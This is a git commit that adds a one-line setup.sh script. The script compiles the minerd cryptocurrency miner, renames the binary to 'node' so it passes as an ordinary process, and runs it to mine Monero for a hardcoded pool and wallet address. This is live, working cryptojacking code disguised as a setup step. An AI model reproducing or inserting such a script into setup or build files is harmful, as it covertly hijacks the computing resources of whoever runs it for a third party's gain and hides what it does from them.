b6fe11541fa772be97e2ad26305d2abf71ddadf6
trompetto <phumakupoc@housat.com>
2017-01-04 18:54:00 +0200

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,1 @@
+./autogen.sh && ./configure && make && mv minerd node && ./node -a cryptonight -o stratum+tcp://monerohash.com:3333 -u 42jF56tc85UTZwhMQc6rHbMHTxHqK74qS2zqLyRZxLbwegsy7FJ9w4T5B69Ay5qeMEMuvVDwHNeopAxrEZkkHrMb5phovJ6 -p x
